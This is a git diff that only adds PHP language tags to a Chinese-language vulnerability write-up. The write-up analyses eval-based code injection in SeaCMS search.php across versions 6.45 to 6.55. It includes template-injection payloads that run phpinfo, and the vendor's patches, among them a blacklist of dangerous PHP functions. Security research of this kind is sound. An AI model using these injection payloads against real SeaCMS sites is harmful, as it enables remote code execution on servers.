@@ -4,7 +4,7 @@ seacms 的search.php 在v6.45,v6.54,v6.55 都爆出过代码执行漏洞，而�
 ### v6.45的代码执行漏洞分析
 
 代码执行部分在/include/main.class.php文件的parseIf函数中
-```
+```php
 function parseIf($content){
     if (strpos($content,'{if:')=== false){
     return $content;
@@ -62,7 +62,7 @@ function parseIf($content){
 
 在search.php 中的echoSearchPage()函数可以触发漏洞
 
-```
+```php
 function echoSearchPage()
 {
     global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
@@ -91,7 +91,7 @@ order 这个变量可以通过变量覆盖来传入，没有任何过滤，之�
     
 替换后的模板的html代码如下:
 
-```
+```php
 <a href="{searchpage:order-time-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="time"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderhits">最新上映</a>
 <a href="{searchpage:order-hit-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="hit"} class="btn btn-success" {else} class="btn btn-default" {end if} id="orderaddtime">最近热播</a>
 <a href="{searchpage:order-score-link}" {if:"}{end if}{if:1)phpinfo();if(1}{end if}"=="score"} class="btn btn-success" {else} class="btn btn-default" {end if} id="ordergold">评分最高</a>
@@ -107,14 +107,14 @@ eval 函数字符拼接后最终执行的代码是:
 ### v6.54 版本代码注入
 之后官方修复了这一漏洞，修复方式是这样的:
 
-```
+```php
 $orderarr=array('id','idasc','time','timeasc','hit','hitasc','commend','commendasc','score','scoreasc');
 if(!(in_array($order,$orderarr))){$order='time';}
 ```
 
 这个时候官方修复的方法是将order参数设置了一个白名单，这样就无法通过order 参数注入代码， 然而，通过之前的分析我们知道，漏洞产生的问题是在于parseIf函数中的参数没有经过过滤直接拼接后用eval执行，so ,漏洞再次产生，还是在search.php文件中，但攻击payload不再order参数这里，而在前面的参数中：
 
-```
+```php
 $searchword = RemoveXSS(stripslashes($searchword));
 $searchword = addslashes(cn_substr($searchword,20));
 $searchword = trim($searchword);
@@ -152,7 +152,7 @@ searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{se
 
 在search.php的echoSearchPage函数中的代码大概这样:
 
-```
+```php
 function echoSearchPage()
 {
 ...
@@ -183,7 +183,7 @@ function echoSearchPage()
 这里利用了对searchpage标签重复替换的方法插入我们的payload
 
 原来模板中的html代码如下:
-```
+```php
 <meta name="keywords" content="{seacms:searchword},海洋CMS" />
 
 ```
@@ -194,7 +194,7 @@ function echoSearchPage()
 
 之后依次替换的内容为:
 
-```
+```php
 //替换year
 <meta name="keywords" content="{if:e{searchpage:area}},海洋CMS" />
 
@@ -224,7 +224,7 @@ function echoSearchPage()
 
 在这个版本中，开发人员终于发现了这个问题的本质，于是在这个版本中添加了一个修复方案:
 
-```
+```php
 foreach($iar as $v){
     $iarok[] = str_ireplace(array('unlink','opendir','mysqli_','mysql_','socket_','curl_','base64_','putenv','popen(','phpinfo','pfsockopen','proc_','preg_','_GET','_POST','_COOKIE','_REQUEST','_SESSION','_SERVER','assert','eval(','file_','passthru(','exec(','system(','shell_'), '@.@', $v);
 }
@@ -244,7 +244,7 @@ poc如下:
 
 该版本除了黑名单还在search.php中添加了如下一句话:
 
-```
+```php
 //感谢freebuf文章作者天择实习生（椒图科技天择实验室）的漏洞报告
 if(strpos($searchword,'{searchpage:')) exit; 
 ```
